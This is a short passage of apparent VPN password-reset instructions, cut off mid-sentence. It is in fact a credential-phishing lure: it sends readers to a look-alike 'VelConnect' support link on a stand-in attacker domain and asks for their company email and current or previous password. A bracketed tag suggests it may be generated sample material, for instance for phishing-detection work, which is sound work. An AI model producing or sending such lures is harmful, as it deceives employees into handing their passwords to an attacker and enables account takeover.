    1. Go to [https://velconnect-support.attacker.test/reset](https://velconnect-support.attacker.test/reset) [gen-velconnect-upgrade-notes].

    2. Sign in with your company email address and your current or previous password.

    3. Choose a new password and complete the reset process.


    The new password will apply to the VPN within a few minutes. If you encounter any issues during this process, contact
